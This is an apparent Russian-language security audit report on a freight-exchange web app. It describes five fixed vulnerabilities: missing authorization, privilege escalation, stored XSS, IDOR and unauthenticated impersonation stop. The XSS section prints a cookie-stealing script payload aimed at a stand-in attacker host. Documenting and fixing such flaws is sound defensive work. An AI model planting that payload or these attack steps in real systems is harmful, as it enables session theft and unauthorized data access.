## Найденные и устранённые уязвимости

### 1. Открытый доступ к данным контактных заявок

**Файл:** `packages/backend/src/routes/admin/contacts.ts`  
**Критичность:** Высокая  
**Категория:** Нарушение контроля доступа (Broken Access Control)

**Описание:**  
Эндпоинт `GET /admin/contacts`, возвращающий все заявки из контактной формы (имя, email, текст сообщения), не требовал авторизации. Любой анонимный пользователь мог получить полный список обращений.

**Сценарий атаки:**  
Злоумышленник отправляет запрос `GET /api/admin/contacts` без каких-либо credentials и получает персональные данные всех пользователей, написавших через форму обратной связи.

**Исправление:**  
Добавлена проверка авторизации и роли `admin` перед выдачей данных.

---

### 2. Возможность повышения привилегий при регистрации

**Файл:** `packages/backend/src/auth/index.ts`  
**Критичность:** Высокая  
**Категория:** Privilege Escalation

**Описание:**  
В конфигурации библиотеки `better-auth` поле `role` имело флаг `input: true`, что означало приём роли пользователя из тела запроса. При наличии доступа к нативным эндпоинтам `better-auth` злоумышленник мог зарегистрироваться с ролью `admin`.

**Сценарий атаки:**  
Запрос на регистрацию с полем `"role": "admin"` через нативный эндпоинт библиотеки позволял создать аккаунт с правами администратора.

**Исправление:**  
Флаг изменён на `input: false`. Роль теперь устанавливается исключительно на стороне сервера.

---

### 3. XSS через отображение Markdown в правовых документах

**Файл:** `packages/frontend/pages/legal/[docType].vue`  
**Критичность:** Высокая  
**Категория:** Stored XSS (межсайтовый скриптинг)

**Описание:**  
Страницы правовых документов (пользовательское соглашение, политика конфиденциальности) отображают контент через `v-html` после парсинга Markdown библиотекой `marked`. По умолчанию `marked` не фильтрует HTML-теги, что позволяло внедрить произвольный JavaScript. Страница публично доступна без авторизации.

**Сценарий атаки:**  
Скомпрометированный администратор сохраняет в правовом документе `<script>document.location='https://attacker.com/?c='+document.cookie</script>`. Вредоносный код выполняется у каждого посетителя страницы, включая незарегистрированных пользователей.

**Исправление:**  
Вывод `marked.parse()` теперь проходит через `DOMPurify.sanitize()` перед передачей в `v-html`. Установлена библиотека `dompurify@3.4.3`.

### 4. IDOR — чтение чужих заказов без проверки владельца

**Файл:** `packages/backend/src/routes/cabinet/client/orders.ts`  
**Критичность:** Средняя  
**Категория:** Insecure Direct Object Reference (IDOR)

**Описание:**  
Эндпоинт `GET /cabinet/orders/:id` требовал авторизации, но не проверял, является ли запрашивающий пользователь владельцем заказа. Любой авторизованный пользователь (в том числе водитель) мог читать детали чужих заказов по UUID.

**Сценарий атаки:**  
Авторизованный водитель перебирает UUID заказов и читает закрытые данные клиентов: черновики, подтверждённые заказы, примечания, ценовые условия.

**Исправление:**  
Добавлена проверка: заказы в статусе `draft`, `confirmed` и далее доступны только владельцу. Заказы в статусах `published` и `negotiating` остаются открытыми для всех авторизованных пользователей (это необходимо для работы биржи грузоперевозок).

### 5. Остановка сессии импersonации без авторизации

**Файл:** `packages/backend/src/routes/admin/impersonate.ts`  
**Критичность:** Средняя  
**Категория:** Отсутствие авторизации (Missing Authentication)

**Описание:**  
Эндпоинт `POST /admin/impersonate/stop`, завершающий сессию просмотра от имени пользователя, не требовал авторизации. Любой, включая анонимных посетителей, мог принудительно прервать активную admin-сессию.

**Сценарий атаки:**  
Сторонний сайт с помощью CSRF-запроса прерывает сессию администратора, находящегося в режиме просмотра от имени пользователя, что нарушает процесс расследования инцидентов.

**Исправление:**  
Добавлена проверка валидной сессии перед обработкой запроса.

## Что не было выявлено (подтверждено как безопасное)

- **SQL-инъекции:** все запросы к БД используют параметризованные шаблоны Drizzle ORM, конкатенация строк в запросах отсутствует.
- **Path traversal при работе с файлами:** эндпоинты отдачи файлов применяют санитизацию имён и фиксированные базовые директории.
- **WebSocket чат:** проверка доступа реализована корректно — клиент должен быть владельцем заказа, водитель — иметь ставку.
- **IDOR в документах водителя:** обновление документов проверяет принадлежность через `carrierId`.
